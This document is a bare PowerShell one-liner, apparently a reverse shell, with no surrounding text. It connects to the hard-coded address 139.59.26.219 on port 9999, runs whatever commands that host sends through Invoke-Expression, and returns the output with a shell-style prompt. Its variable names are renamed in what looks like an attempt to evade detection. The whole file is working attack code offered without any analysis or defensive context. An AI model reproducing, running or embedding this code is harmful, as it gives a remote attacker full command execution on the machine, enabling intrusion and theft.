$cthulhu = New-Object System.Net.Sockets.TCPClient('139.59.26.219',9999);$tntcl = $cthulhu.GetStream();[byte[]]$cult = 0..65535|% {0};while(($i = $tntcl.Read($cult, 0, $cult.Length)) -ne 0) {;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($cult,0, $i);$ex = (iex $d 2>&1 | Out-String );$ex2 = $ex + '<ASTUTE>' + (pwd).Path + '> '; $shog =([text.encoding]::ASCII).GetBytes($ex2);$tntcl.write($shog,0,$shog.Length); $tntcl.Flush()};
